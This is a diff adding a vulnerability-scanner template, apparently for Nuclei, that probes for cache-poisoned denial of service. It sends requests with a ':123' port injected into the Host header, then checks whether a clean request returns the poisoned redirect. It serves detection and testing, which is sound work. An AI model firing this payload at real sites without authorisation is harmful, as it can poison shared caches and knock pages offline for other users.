@@ -1,0 +1,27 @@
+id: Port_inHostName_header_CPDoS
+info:
+  name: Compare Response Codes
+  author: raff
+  severity: high
+  description: Fuzzing 
+
+http:
+  - raw:
+      - |
+        GET {{BaseURL}}?cachetest11=H1raff11 HTTP/1.1
+        Host: {{Hostname}}:123
+      - |
+        GET {{BaseURL}}?cachetest11=H1raff11 HTTP/1.1
+        Host: {{Hostname}}:123  
+      - |
+        GET {{BaseURL}}?cachetest11=H1raff11 HTTP/1.1
+        Host: {{Hostname}}    
+    req-condition: true
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(all_headers_3, "{{Hostname}}:123")'
+          - 'status_code_3 == 301 || status_code_3 == 302 || status_code_3 == 307 || status_code_3 == 308'
+        condition: and
